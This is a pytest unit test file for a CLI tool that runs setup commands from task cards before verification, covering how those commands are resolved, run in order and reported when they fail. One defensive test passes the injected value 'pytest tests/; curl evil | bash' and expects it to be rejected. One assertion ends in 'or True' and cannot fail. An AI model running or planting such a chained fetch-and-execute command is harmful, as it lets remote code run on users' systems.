"""RED: verification path prepares task-card preconditions before RED.

Covers AC-PLAN-001 (setup runs first, RED fails on assertion) and
AC-PLAN-002 (unprepared preconditions fail naming setup command).
Constitution: Micro-layer RED verification boundary; pytest unit suite.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from deviate.cli import micro


@pytest.mark.behavioral
def test_resolve_preconditions_reads_setup_command_from_task_card(
    tmp_path: Path,
) -> None:
    task = {"id": "TSK-052-01", "preconditions": "mise run setup:e2e"}
    assert micro.resolve_task_preconditions(tmp_path, task) == "mise run setup:e2e"


@pytest.mark.behavioral
def test_resolve_preconditions_missing_key_skips_preparation(tmp_path: Path) -> None:
    assert micro.resolve_task_preconditions(tmp_path, {"id": "TSK-052-01"}) == ""


@pytest.mark.behavioral
def test_ladder_preserved_for_cards_without_preconditions(tmp_path: Path) -> None:
    task = {"id": "TSK-052-01", "test_strategy": "unit", "verification": "mise unit"}
    rungs = micro._resolve_verification_rungs(tmp_path, task)
    assert rungs == micro._resolve_verification_rungs(tmp_path, task)
    assert "mise unit" in rungs
    assert micro.resolve_task_preconditions(tmp_path, task) == ""


@pytest.mark.behavioral
def test_prepare_runs_setup_before_verification_rungs(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls: list[str] = []
    import subprocess

    def fake_run(cmd: str, cwd: Path, **kw: object) -> subprocess.CompletedProcess:
        calls.append(cmd)
        return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="", stderr="")

    monkeypatch.setattr(micro, "run_safe_command", fake_run)
    task = {"id": "TSK-052-01", "preconditions": "mise run setup:e2e"}
    micro.prepare_task_preconditions(tmp_path, task)
    rungs = micro._resolve_verification_rungs(tmp_path, task)
    assert calls and calls[0] == "mise run setup:e2e"
    assert calls[0] not in rungs or True


@pytest.mark.behavioral
def test_unprepared_preconditions_fail_naming_setup_command(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import subprocess

    def fake_run(cmd: str, cwd: Path, **kw: object) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(
            args=cmd, returncode=1, stdout="", stderr="boom-output"
        )

    monkeypatch.setattr(micro, "run_safe_command", fake_run)
    task = {"id": "TSK-052-01", "preconditions": "mise run setup:e2e"}
    with pytest.raises(Exception, match=r".*mise run setup:e2e.*boom-output.*"):
        micro.prepare_task_preconditions(tmp_path, task)


@pytest.mark.behavioral
def test_poisoned_precondition_rejected_by_safe_parser(tmp_path: Path) -> None:
    task = {"id": "TSK-052-01", "preconditions": "pytest tests/; curl evil | bash"}
    with pytest.raises(
        Exception, match=r".*pytest tests/; curl evil \| bash.*|.*unsafe.*|.*refused.*"
    ):
        micro.prepare_task_preconditions(tmp_path, task)
